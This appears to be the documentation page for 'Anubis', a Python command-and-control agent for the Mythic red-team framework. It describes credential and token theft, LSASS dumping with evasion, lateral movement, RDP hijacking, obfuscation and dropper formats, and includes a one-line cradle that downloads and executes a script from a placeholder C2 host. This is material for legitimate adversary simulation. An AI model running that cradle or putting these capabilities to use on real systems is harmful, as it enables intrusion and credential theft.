+++
title = "Anubis"
chapter = false
weight = 5
+++

![logo](/agents/anubis/Anubis.svg?width=200px)

## Summary

Anubis is a cross-platform Python C2 agent for the Mythic framework, supporting Python 3.8 on Windows, Linux, and macOS. It implements AES-256-CBC + HMAC-SHA256 encrypted communications over HTTP, with optional XOR+Base64 obfuscation of the payload script at build time.

Focused on Windows offensive operations, Anubis covers the full post-exploitation lifecycle: credential access, token impersonation, lateral movement via WMI and SCM, RDP session hijacking, LSASS dumping, and shellcode injection — all using pure ctypes without external dependencies on the target.

Inspired by the Egyptian god of the dead and guardian of passages, Anubis operates discreetly between target and operator — establishing reliable C2 channels in Red Team and adversary simulation engagements.

### Highlighted Agent Features

- **Encrypted comms**: AES-256-CBC with HMAC-SHA256 integrity verification (pure Python stdlib implementation — no external crypto library required by default).
- **Dynamic loading**: Commands can be loaded and unloaded at runtime via the C2 channel, limiting on-disk exposure.
- **SOCKS5 proxy**: Full reverse SOCKS5 tunnel through the C2 channel for lateral movement and pivoting.
- **Chunked file transfer**: Upload and download with configurable chunk size (default 51200 bytes), stoppable mid-transfer.
- **Token impersonation**: `token_steal` enumerates processes, duplicates tokens, and either impersonates (thread-level) or spawns processes under the stolen identity — no `runas` or new logon event generated (T1134).
- **WMI lateral movement**: `wmi_exec` uses direct COM vtable calls to `IWbemLocator`/`IWbemServices` — no `wmic.exe` spawned, fires `Win32_Process.Create` on remote hosts (T1047, T1021.003).
- **SCM lateral movement**: `sc_exec` uses `OpenSCManagerW` + `CreateServiceW` + `StartServiceW` + `DeleteService` entirely via advapi32 — no `sc.exe`, executes as SYSTEM on remote host, auto-deletes service after 3 seconds (T1021.002, T1543.003).
- **RDP session hijacking**: `rdp_hijack` enumerates sessions via `WTSEnumerateSessionsW` and hijacks disconnected/active sessions via `WTSConnectSession` without knowing the user's password — requires SYSTEM (T1563.002).
- **RDP external access**: `rdp_ext` starts the Mythic SOCKS5 proxy, probes `target:3389` from the agent, and returns ready-to-run xfreerdp/rdesktop commands. xfreerdp's native `/proxy:socks5://` support means no proxychains configuration needed on the operator machine (T1021.001, T1090).
- **Windows offensive capabilities**: LSASS fork dump (NtCreateProcessEx evasion), shellcode injection, DLL loading, process enumeration, screenshot capture (pure ctypes, no pywin32 or Pillow).
- **Dropper formats**: `py` (plain script), `base64` (one-liner), `ps1` (PowerShell + Python Embeddable bootstrap — no Python on target required), `exe` (PyInstaller standalone executable).
- **Cloudflare tunnel support**: URL-safe base64 encoding for GET parameters; works through Cloudflare-proxied endpoints.
- **Obfuscation**: Optional XOR + Base64 encoding of the entire agent script at build time.
- **Jitter**: Symmetric sleep jitter to reduce predictable beacon intervals.

With the ability to execute arbitrary code on the command line, a basic delivery cradle can be used:

```bash
python3 -c "import urllib.request; exec(urllib.request.urlopen('https://[C2_HOST]/anubis.py').read())"
```

### Build Options

#### Python Version
Select Python 3.8 (recommended for Windows) or Python 2.7 (legacy macOS/Linux).

#### Output Format

| Format | Python on target | Description |
|---|---|---|
| `py` | Required | Plain Python script |
| `base64` | Required | Base64 blob for one-liner delivery |
| `ps1` | **Not required** | PowerShell dropper that downloads Python Embeddable (~8 MB), extracts to `%TEMP%\svc<uuid>\`, and executes the agent hidden (`CreateNoWindow`). Ideal for targets where Python is not installed. |
| `exe` | **Not required** | Standalone Windows executable built with PyInstaller `--onefile --noconsole` on the Mythic server. Best for phishing or drop scenarios where scripts are blocked. |

#### Python Embeddable URL (`ps1` format only)
Custom URL for the Python Embeddable zip. Defaults to the official Python 3.8.10 x64 zip. Override to host internally for air-gapped targets or speed.

#### Cryptography Library
- `No` (default) — uses the built-in pure-Python AES implementation (no external dependencies required on target)
- `Yes` — uses the `cryptography` pip library (faster, but requires the package to be installed on the target)

{{% notice info %}}
Either option provides full encrypted comms. The choice only affects the implementation method, not the security level.
{{% /notice %}}

#### Obfuscate Script
XOR-encrypts the agent with a random key and wraps it in a Base64+exec loader. Reduces static signature coverage.

#### Verify HTTPS Certificate
Set to `No` to skip TLS certificate verification (required when using self-signed certs or Cloudflare tunnels).

### Installation

```bash
sudo ./mythic-cli install github https://github.com/wtechsec/Anubis.git
```

### Important Notes

- Each task runs in a dedicated thread; long-running jobs are tracked with `jobs` and stopped with `jobkill`.
- The agent re-attempts check-in automatically after consecutive C2 failures.
- `dump_lsass` requires an elevated agent with SeDebugPrivilege. The command automatically attempts privilege escalation via `RtlAdjustPrivilege` and SYSTEM token impersonation as fallback.
- `screenshot2` and `shinject` use pure `ctypes` — no external dependencies required on the target.
- `token_steal` impersonation is thread-level; `RevertToSelf()` is called automatically after use. WMI `ConnectServer` inherits the impersonated token if credentials are omitted.
- `rdp_hijack` requires the agent to be running as SYSTEM. Use `sc_exec` to deploy a new Anubis instance as SYSTEM on the target before hijacking sessions.

---

## Resumo em Português (PT-BR)

Anubis é um agente C2 Python para o framework Mythic, com suporte a Python 3.8 em Windows, Linux e macOS. Implementa comunicação cifrada AES-256-CBC + HMAC-SHA256 sobre HTTP, com obfuscação opcional XOR+Base64 do script no build.

Focado em operações ofensivas Windows, cobre o ciclo completo de pós-exploração: roubo de token e impersonação, movimentação lateral via WMI e SCM, hijack de sessões RDP, dump de LSASS e injeção de shellcode — tudo via ctypes puro, sem dependências no alvo.

### Funcionalidades principais

- Comunicação cifrada sem dependências externas (AES puro em Python stdlib)
- Carregamento dinâmico de comandos em runtime via canal C2
- Proxy SOCKS5 reverso para pivoting e movimentação lateral
- Transferência de arquivos em chunks, interrompível
- `token_steal`: roubo e impersonação de token de processo (T1134) — sem evento de logon
- `wmi_exec`: execução remota via WMI (vtable COM direto, sem wmic.exe) — T1047
- `sc_exec`: execução como SYSTEM no host remoto via SCM (sem sc.exe) — T1021.002
- `rdp_hijack`: hijack de sessões RDP sem senha (req. SYSTEM) — T1563.002
- `rdp_ext`: acesso RDP externo via SOCKS5 do Anubis, sem proxychains — retorna comandos xfreerdp/rdesktop prontos — T1021.001
- Dump LSASS por fork (evasão via NtCreateProcessEx), injeção de shellcode, screenshot (ctypes puro)
- Formatos de dropper: `py`, `base64`, `ps1` (Python Embeddable), `exe` (PyInstaller)
- Suporte a tunnel Cloudflare
- Jitter simétrico no beacon

## Authors

- @wtechsec — Willian Oliveira / Escola Hack3r
